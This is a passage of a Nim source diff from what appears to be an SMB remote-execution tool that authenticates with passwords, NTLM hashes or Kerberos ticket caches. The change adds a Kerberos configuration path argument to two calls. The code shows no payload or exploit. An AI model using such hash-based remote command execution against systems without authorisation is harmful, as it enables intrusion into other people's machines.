+          result.add "\n" & kv("key", node{"key"}.getStr())
         if node{"message"}.getStr().len > 0 and not ok:
           result.add "\n" & kv("message", node{"message"}.getStr())
         result.add "\n" & bottomBorder()
@@ -12712,7 +13938,8 @@ proc runShell(config: CliConfig) =
         max(config.timeoutMs, 8000),
         config.username, config.password, config.ntlmHash, config.domain, cmd,
         authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
-        ccache = config.ccachePath)
+        ccache = config.ccachePath,
+        krb5Config = config.krb5ConfigPath)
       result.output = r.output
       if not r.success: result.err = if r.error.len > 0: r.error else: r.message
     of "bin":
@@ -13896,7 +15123,8 @@ local shell commands:
       max(config.timeoutMs, 8000),
       config.username, config.password, config.ntlmHash, config.domain,
       authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
-      ccache = config.ccachePath)
+      ccache = config.ccachePath,
+      krb5Config = config.krb5ConfigPath)
     if not at.ready:
       stderr.writeLine gray("[") & bold(proto) & gray("] ") &
         brightCyan(host & ":" & $config.port) & "  " & dim(principal)
